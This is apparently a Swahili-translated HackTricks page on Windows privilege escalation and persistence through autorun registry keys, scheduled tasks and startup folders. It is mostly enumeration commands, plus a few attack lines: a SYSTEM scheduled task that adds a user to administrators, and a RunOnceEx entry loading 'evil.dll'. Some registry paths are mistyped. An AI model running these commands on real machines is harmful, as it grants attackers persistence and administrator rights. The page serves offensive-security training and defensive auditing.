# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}

## WMIC

**Wmic** inaweza kutumika kuendesha programu kwenye **kuanzisha**. Angalia ni binaries gani zimepangwa kuendesha kwenye kuanzisha kwa:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Kazi za Ratiba

**Kazi** zinaweza kuandaliwa kuendesha kwa **mara kwa mara** fulani. Angalia ni binaries gani zimepangwa kuendesha na:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folders

Binaries zote zilizoko katika **Startup folders zitatekelezwa wakati wa kuanzisha**. Folders za kawaida za kuanzisha ni zile zilizoorodheshwa hapa chini, lakini folda ya kuanzisha inaonyeshwa katika rejista. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registry

> [!NOTE]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Kichupo cha **Wow6432Node** kinadhihirisha kuwa unatumia toleo la Windows la 64-bit. Mfumo wa uendeshaji unatumia funguo hii kuonyesha mtazamo tofauti wa HKEY_LOCAL_MACHINE\SOFTWARE kwa programu za 32-bit zinazotumika kwenye toleo la Windows la 64-bit.

### Runs

**Inajulikana kwa kawaida** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Funguo za registry zinazojulikana kama **Run** na **RunOnce** zimeundwa ili kutekeleza programu kiotomatiki kila wakati mtumiaji anapoingia kwenye mfumo. Mstari wa amri uliotolewa kama thamani ya data ya funguo umewekwa mipaka ya herufi 260 au chini.

**Service runs** (zinaweza kudhibiti kuanzishwa kiotomatiki kwa huduma wakati wa boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Katika Windows Vista na toleo la baadaye, funguo za registry **Run** na **RunOnce** hazizalishwi kiotomatiki. Kuingizwa katika funguo hizi kunaweza kuanzisha programu moja kwa moja au kuzitaja kama utegemezi. Kwa mfano, ili kupakia faili ya DLL wakati wa kuingia, mtu anaweza kutumia funguo ya registry **RunOnceEx** pamoja na funguo ya "Depend". Hii inaonyeshwa kwa kuongeza kuingizwa kwa registry kutekeleza "C:\temp\evil.dll" wakati wa kuanzishwa kwa mfumo:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Exploit 1**: Ikiwa unaweza kuandika ndani ya yoyote ya rejista zilizotajwa ndani ya **HKLM** unaweza kuongeza mamlaka wakati mtumiaji tofauti anapoingia.

> [!NOTE]
> **Exploit 2**: Ikiwa unaweza kufuta yoyote ya binaries zilizotajwa kwenye yoyote ya rejista ndani ya **HKLM** unaweza kubadilisha binary hiyo kwa backdoor wakati mtumiaji tofauti anapoingia na kuongeza mamlaka.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Njia ya Kuanzisha

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Viungo vilivyowekwa katika folda ya **Kuanzisha** vitasababisha huduma au programu kuanzishwa wakati wa kuingia kwa mtumiaji au upya wa mfumo. Mahali pa folda ya **Kuanzisha** lin defined katika rejista kwa mipango ya **Mashine ya Mitaa** na **Mtumiaji wa Sasa**. Hii inamaanisha kwamba kiungo chochote kilichoongezwa kwenye maeneo haya maalum ya **Kuanzisha** kitahakikisha huduma au programu iliyounganishwa inaanza baada ya mchakato wa kuingia au upya, na kufanya kuwa njia rahisi ya kupanga programu kuendesha kiotomatiki.

> [!NOTE]
> Ikiwa unaweza kubadilisha chochote \[User] Shell Folder chini ya **HKLM**, utaweza kuielekeza kwenye folda inayodhibitiwa na wewe na kuweka nyuma ya mlango itakayotekelezwa wakati wowote mtumiaji anapoingia kwenye mfumo ikipandisha mamlaka.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Kwa kawaida, ufunguo wa **Userinit** umewekwa kwenye **userinit.exe**. Hata hivyo, ikiwa ufunguo huu umebadilishwa, executable iliyoainishwa pia itazinduliwa na **Winlogon** wakati wa kuingia kwa mtumiaji. Vivyo hivyo, ufunguo wa **Shell** unakusudia kuelekeza kwenye **explorer.exe**, ambayo ni shell ya kawaida kwa Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> Ikiwa unaweza kubadilisha thamani ya registry au binary utaweza kuongeza mamlaka.

### Sera za Mipangilio

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Angalia ufunguo wa **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Kubadilisha Amri ya Salama ya Msimbo

Katika Usajili wa Windows chini ya `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, kuna thamani ya **`AlternateShell`** iliyowekwa kwa chaguo-msingi kuwa `cmd.exe`. Hii inamaanisha unapochagua "Salama Msimbo na Amri" wakati wa kuanzisha (kwa kubonyeza F8), `cmd.exe` inatumika. Lakini, inawezekana kuandaa kompyuta yako kuanzisha moja kwa moja katika hali hii bila kuhitaji kubonyeza F8 na kuchagua kwa mikono.

Hatua za kuunda chaguo la kuanzisha ili kuanzisha moja kwa moja katika "Salama Msimbo na Amri":

1. Badilisha sifa za faili ya `boot.ini` kuondoa bendera za kusoma pekee, mfumo, na zilizofichwa: `attrib c:\boot.ini -r -s -h`
2. Fungua `boot.ini` kwa ajili ya kuhariri.
3. Ingiza mstari kama: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Hifadhi mabadiliko kwenye `boot.ini`.
5. Rudisha sifa za awali za faili: `attrib c:\boot.ini +r +s +h`

- **Kuvunja 1:** Kubadilisha funguo za usajili za **AlternateShell** kunaruhusu usanidi wa shell ya amri ya kawaida, huenda kwa ufikiaji usioidhinishwa.
- **Kuvunja 2 (Ruhusa za Kuandika PATH):** Kuwa na ruhusa za kuandika sehemu yoyote ya mfumo wa **PATH** variable, hasa kabla ya `C:\Windows\system32`, kunakuwezesha kutekeleza `cmd.exe` ya kawaida, ambayo inaweza kuwa nyuma ya mlango ikiwa mfumo utaanzishwa katika Hali ya Salama.
- **Kuvunja 3 (Ruhusa za Kuandika PATH na boot.ini):** Upatikanaji wa kuandika kwenye `boot.ini` unaruhusu kuanzisha Hali ya Salama kiotomatiki, ikirahisisha ufikiaji usioidhinishwa kwenye kuanzisha kwa pili.

Ili kuangalia mipangilio ya sasa ya **AlternateShell**, tumia amri hizi:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup ni kipengele katika Windows ambacho **kinanzishwa kabla ya mazingira ya desktop kupakiwa kikamilifu**. Kinatoa kipaumbele kwa utekelezaji wa amri fulani, ambazo lazima zikamilike kabla ya kuingia kwa mtumiaji kuendelea. Mchakato huu unafanyika hata kabla ya kuanzishwa kwa entries nyingine za kuanzisha, kama zile katika sehemu za Run au RunOnce za rejista.

Active Setup inasimamiwa kupitia funguo za rejista zifuatazo:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Ndani ya funguo hizi, kuna funguo ndogo mbalimbali, kila moja ikihusiana na kipengele maalum. Thamani za funguo zinazovutia ni pamoja na:

- **IsInstalled:**
- `0` inaonyesha amri ya kipengele haitatekelezwa.
- `1` inamaanisha amri itatekelezwa mara moja kwa kila mtumiaji, ambayo ni tabia ya kawaida ikiwa thamani ya `IsInstalled` haipo.
- **StubPath:** Mwelekeo wa amri itakayotekelezwa na Active Setup. Inaweza kuwa amri yoyote halali ya mstari, kama kuanzisha `notepad`.

**Security Insights:**

- Kubadilisha au kuandika kwenye funguo ambapo **`IsInstalled`** imewekwa kuwa `"1"` na **`StubPath`** maalum kunaweza kusababisha utekelezaji wa amri zisizoidhinishwa, huenda kwa ajili ya kupandisha hadhi.
- Kubadilisha faili ya binary inayorejelewa katika thamani yoyote ya **`StubPath`** pia kunaweza kufanikisha kupandisha hadhi, ikiwa na ruhusa za kutosha.

Ili kukagua mipangilio ya **`StubPath`** katika vipengele vya Active Setup, amri hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) ni moduli za DLL ambazo zinaongeza vipengele vya ziada kwa Internet Explorer ya Microsoft. Zinapakia kwenye Internet Explorer na Windows Explorer kila wakati zinapoanzishwa. Hata hivyo, utekelezaji wao unaweza kuzuiwa kwa kuweka ufunguo wa **NoExplorer** kuwa 1, kuzuia kutoka kupakia na mifano ya Windows Explorer.

BHOs zinaendana na Windows 10 kupitia Internet Explorer 11 lakini hazipati msaada katika Microsoft Edge, kivinjari cha chaguo-msingi katika matoleo mapya ya Windows.

Ili kuchunguza BHOs zilizosajiliwa kwenye mfumo, unaweza kukagua ufunguo wa rejista zifuatazo:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Kila BHO inawakilishwa na **CLSID** yake katika rejista, ikihudumu kama kitambulisho cha kipekee. Taarifa za kina kuhusu kila CLSID zinaweza kupatikana chini ya `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Ili kuuliza BHOs katika rejista, amri hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Kumbuka kwamba rejista itakuwa na rejista 1 mpya kwa kila dll na itawakilishwa na **CLSID**. Unaweza kupata taarifa za CLSID katika `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Fungua Amri

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Chaguzi za Utekelezaji wa Faili za Picha
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Kumbuka kwamba tovuti zote ambapo unaweza kupata autoruns **zimeshafanyiwa utafiti na** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Hata hivyo, kwa **orodha kamili zaidi ya** faili zinazotekelezwa kiotomatiki unaweza kutumia [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) kutoka sysinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Zaidi

**Pata zaidi kuhusu Autoruns kama vile rekodi katika** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Marejeleo

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)



{{#include ../../banners/hacktricks-training.md}}
